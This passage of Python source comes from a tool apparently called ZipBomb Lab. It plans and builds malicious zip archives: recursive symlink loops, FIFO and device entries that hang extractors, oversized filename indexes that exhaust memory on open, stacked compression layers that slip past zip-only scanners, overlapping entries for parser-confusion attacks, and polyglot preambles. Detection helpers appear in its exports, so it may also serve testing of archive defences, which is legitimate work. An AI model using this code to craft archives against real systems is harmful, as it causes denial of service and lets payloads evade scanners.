        depth = int(DEFAULT_TRAVERSAL_DEPTH if layers is None else layers)
        if not 1 <= depth <= 64:
            raise ValueError("traversal depth must be between 1 and 64")
        leaf = max(1, target_bytes // count)
        plan = BombPlan(
            recipe="traversal", method=method, level=level, layers=depth, fanout=count,
            leaf_bytes=leaf, name_style=name_style, expanded_bytes=leaf * count,
            declared_bytes=leaf * count, archive_bytes=0, ratio=1.0,
            outer_entries=5 + count, total_entries=5 + count, zip64=False,
            seconds=target_bytes / throughput, processed_bytes=target_bytes,
            measured=True, trigger="traversal", preamble=preamble,
            method_schedule=(method,), warnings=warnings,
        )
        plan.archive_bytes = _measure_or_model(
            _build_traversal, plan, target_bytes, calibration.ratio, warnings, _model_entries
        )
        plan.ratio = plan.expanded_bytes / max(plan.archive_bytes, 1)
        warnings.extend(
            [
                "symlink entries loop back to '.' and '..', so a recursive walk of "
                "the extracted tree (cp -r, find -L, backups, AV) never terminates",
                "FIFO and device entries make tools that read every extracted file "
                "block forever",
                "honour depends on the extractor: Info-ZIP and bsdtar recreate the "
                "links, Python's zipfile writes regular files instead",
            ]
        )
        return plan

    if recipe.key == "onopen":
        count = int(recipe.default_entries if entries is None else entries)
        if not 1 <= count <= 65534:
            raise ValueError("entry count must be between 1 and 65,534")
        leaf = max(1, target_bytes // count)
        plan = BombPlan(
            recipe="onopen", method=method, level=level, layers=1, fanout=count,
            leaf_bytes=leaf, name_style=name_style, expanded_bytes=leaf * count,
            declared_bytes=leaf * count, archive_bytes=0, ratio=1.0,
            outer_entries=count, total_entries=count, zip64=False,
            seconds=target_bytes / throughput, processed_bytes=target_bytes,
            measured=True, trigger="parse", name_length=ONOPEN_NAME_LENGTH,
            preamble=preamble, method_schedule=(method,), warnings=warnings,
        )
        plan.archive_bytes = _measure_or_model(
            _build_onopen, plan, target_bytes, calibration.ratio, warnings, _model_entries
        )
        plan.ratio = plan.expanded_bytes / max(plan.archive_bytes, 1)
        warnings.append(
            f"the index alone carries {count * (ONOPEN_NAME_LENGTH + 15):,} bytes of "
            f"names; parsers that build a full tree on open can exhaust memory "
            f"before a single byte is written"
        )
        return plan

    if recipe.key == "stack":
        depth = int(3 if layers is None else layers)
        if not 1 <= depth <= 16:
            raise ValueError("stack depth must be between 1 and 16")
        plan = BombPlan(
            recipe="stack", method=method, level=level, layers=depth, fanout=1,
            leaf_bytes=target_bytes, name_style=name_style, expanded_bytes=target_bytes,
            declared_bytes=target_bytes, archive_bytes=0, ratio=1.0,
            outer_entries=1, total_entries=1, zip64=False,
            seconds=target_bytes / throughput, processed_bytes=target_bytes,
            measured=True, trigger="codec", preamble=preamble,
            method_schedule=tuple(STACK_CYCLE[index % len(STACK_CYCLE)] for index in range(depth)),
            warnings=warnings,
        )
        plan.archive_bytes = _measure_or_model(
            _build_stack, plan, target_bytes, calibration.ratio, warnings, _model_stack
        )
        plan.ratio = plan.expanded_bytes / max(plan.archive_bytes, 1)
        warnings.append(
            "scanners that only recurse into zips will not follow the "
            "gzip/xz/bzip2 layers; zip-only tools report one small member"
        )
        return plan

    # overlap
    leaf = max(1, min(target_bytes, 4 * MIB))
    data = _craft_overlap(leaf)
    plan = BombPlan(
        recipe="overlap", method=method, level=level, layers=1, fanout=2,
        leaf_bytes=leaf, name_style=name_style, expanded_bytes=craft.ZIP64_LIMIT,
        declared_bytes=craft.ZIP64_LIMIT, archive_bytes=len(data), ratio=0.0,
        outer_entries=2, total_entries=2, zip64=False,
        seconds=leaf / throughput, processed_bytes=leaf, measured=True,
        trigger="parse", preamble=preamble, method_schedule=(method,), warnings=warnings,
    )
    plan.ratio = plan.expanded_bytes / max(len(data), 1)
    warnings.extend(
        [
            "the central directory claims one member is ~4 GiB while its local "
            "header says otherwise; a scanner and an extractor disagree",
            "ambiguous archives like this are what 'zip confusion' attacks exploit; "
            "the detector flags the mismatch and the shared payload offset",
        ]
    )
    return plan


# -- building --------------------------------------------------------------


def _build_wide(
    path: Path,
    plan: BombPlan,
    tick=None,
) -> None:
    """Stream a wide (many-entry) bomb straight to disk."""
    method_def = methods.get_method(plan.method)
    level = normalize_level(plan.method, plan.level)
    names = _wrapper_names(plan.fanout, plan.name_style, 0)
    if plan.name_style == "mimic":
        names = [f"files/{name}" for name in names]
    with methods.lzma_preset(level):
        with zipfile.ZipFile(
            path,
            "w",
            compression=method_def.zip_constant,
            compresslevel=_compresslevel(plan.method, level),
            allowZip64=True,
        ) as archive:
            for name in names:
                with archive.open(name, "w") as handle:
                    remaining = plan.leaf_bytes
                    while remaining > 0:
                        size = min(ZERO_CHUNK, remaining)
                        handle.write(_ZEROS[:size])
                        remaining -= size
                        if tick is not None:
                            tick(size)
            if plan.name_style == "mimic":
                for name, data in _MIMIC_DECOYS:
                    archive.writestr(name, data)


def _apply_preamble(path: Path, name: str) -> int:
    """Prepend a polyglot preamble, returning the new archive size.

    Readers locate the end-of-central-directory record by scanning backwards,
    so leading bytes are tolerated and the file also satisfies magic-based type
    sniffers. Very large archives are left untouched rather than rewritten.
    """
    preamble = craft.PREAMBLES.get(name, b"")
    if not preamble:
        return path.stat().st_size
    if path.stat().st_size > MAX_ASSEMBLE_BYTES:
        return path.stat().st_size
    payload = path.read_bytes()
    path.write_bytes(preamble + payload)
    return path.stat().st_size


def build_bomb(
    path: Path,
    plan: BombPlan,
    ux: UX | None = None,
    verify: str = "sample",
    overwrite: bool = True,
    show_progress: bool = True,
    progress=None,
) -> "make.CreateResult":  # noqa: F821 - imported lazily below
    """Write *plan* to *path* and return a :class:`make.CreateResult`."""
# merged: from . import make

    ux = ux or UX("auto")
    path = Path(path)

    if plan.recipe == "flat":
        result = make.create_archive(
            path,
            plan.expanded_bytes,
            method=plan.method,
            level=plan.level,
            ux=ux,
            show_progress=show_progress,
            verify=verify,
            overwrite=overwrite,
            warnings=list(plan.warnings),
        )
        if plan.preamble != "none":
            result.archive_bytes = _apply_preamble(path, plan.preamble)
        return result

    if path.exists():
        if not overwrite:
            raise FileExistsError(f"{path} already exists")
        path.unlink()
    path.parent.mkdir(parents=True, exist_ok=True)

    bar = (
        progress
        if progress is not None
        else (
            Progress(plan.processed_bytes or plan.expanded_bytes, ux, label=f"building {plan.recipe}")
            if show_progress
            else None
        )
    )
    tick = bar.advance if bar is not None else None

    started = time.perf_counter()
    if plan.recipe == "wide":
        _build_wide(path, plan, tick=tick)
    elif plan.recipe == "traversal":
        _build_traversal(path, plan, tick=tick)
    elif plan.recipe == "onopen":
        _build_onopen(path, plan, tick=tick)
    elif plan.recipe == "stack":
        _build_stack(path, plan, tick=tick)
    elif plan.recipe == "overlap":
        path.write_bytes(_craft_overlap(plan.leaf_bytes))
    else:
        outer, _sizes = _assemble_layered(
            plan.leaf_bytes,
            plan.layers,
            plan.fanout,
            get_recipe(plan.recipe),
            plan.method,
            plan.level,
            plan.name_style,
            tick=tick,
        )
        path.write_bytes(outer)
    if plan.preamble != "none":
        _apply_preamble(path, plan.preamble)
    elapsed = time.perf_counter() - started
    if bar is not None:
        bar.close()

    with zipfile.ZipFile(path) as archive:
        infos = archive.infolist()
        declared = sum(info.file_size for info in infos)
        compressed = sum(info.compress_size for info in infos)
    archive_bytes = path.stat().st_size

    verify_detail = "structure checked"
    if verify != "none" and plan.recipe in ("wide", "onopen"):
        result = make.verify_archive(path, verify)
        if not result.ok:
            raise ValueError(f"verification failed: {result.detail}")
        verify_detail = result.detail
    elif verify == "full":
        verify_detail = "full recursive verification is unsafe and was skipped"
        ux.warn(verify_detail)

    warnings = list(plan.warnings)
    if verify_detail:
        ux.detail(f"verify ({verify}): {verify_detail}")

    return make.CreateResult(
        path=path,
        target_bytes=plan.expanded_bytes,
        method=plan.method,
        level=plan.level,
        archive_bytes=archive_bytes,
        declared_bytes=declared,
        compressed_bytes=compressed,
        ratio=plan.expanded_bytes / max(archive_bytes, 1),
        seconds=elapsed,
        entries=len(infos),
        resumed_bytes=0,
        interrupted=False,
        warnings=warnings,
        recipe=plan.recipe,
        layers=plan.layers,
        fanout=plan.fanout,
        expanded_bytes=plan.expanded_bytes,
    )

__all__ = ['BombPlan', 'CASCADE_CYCLE', 'CONTAINER_MAGICS', 'CentralEntry', 'CraftError', 'CreateResult', 'DEFAULT_CHUNK', 'DEFAULT_FANOUT', 'DEFAULT_MAX_DEPTH', 'DEFAULT_MAX_ENTRIES', 'DEFAULT_MAX_RATIO', 'DEFAULT_MAX_TOTAL', 'DEFAULT_PROBE_BYTES', 'EXIT_CLEAN', 'EXIT_ERROR', 'EXIT_SUSPICIOUS', 'EntryFinding', 'MAX_ASSEMBLE_BYTES', 'MAX_FANOUT', 'MAX_LAYERS', 'MAX_MEASURE_LEAF_BYTES', 'MIN_LEAF_BYTES', 'NAME_STYLES', 'ONOPEN_NAME_LENGTH', 'PREAMBLES', 'RECIPES', 'Recipe', 'SAMPLE_VERIFY_BYTES', 'STACK_CYCLE', 'S_IFBLK', 'S_IFCHR', 'S_IFDIR', 'S_IFIFO', 'S_IFLNK', 'S_IFREG', 'ScanReport', 'VerifyResult', 'ZIP64_LIMIT', 'ZIP_MAGICS', 'ZipBombError', 'build_bomb', 'central_entries', 'create_archive', 'describe_recipes', 'duplicate_offsets', 'entry_name', 'existing_entries', 'find_eocd', 'get_recipe', 'local_central_mismatches', 'local_header_fields', 'looks_like_polyglot', 'mode_name', 'patch_central', 'plan', 'scan_archive', 'sniff_containers', 'special_info', 'strip_preamble', 'unix_attr', 'unix_mode', 'verify_archive']

# --- backward-compat: old module paths share this module object ---
import sys as _sys_compat2
for _alias in ("craft", "make", "detect", "recipes"):
    _sys_compat2.modules.setdefault(f"{__name__.rsplit('.', 1)[0]}.{_alias}", _sys_compat2.modules[__name__])
del _sys_compat2


__credit__ = "ZipBomb Lab - zipbomb_lab.engine - made by Xv @XvRendering https://github.com/MamadXV"
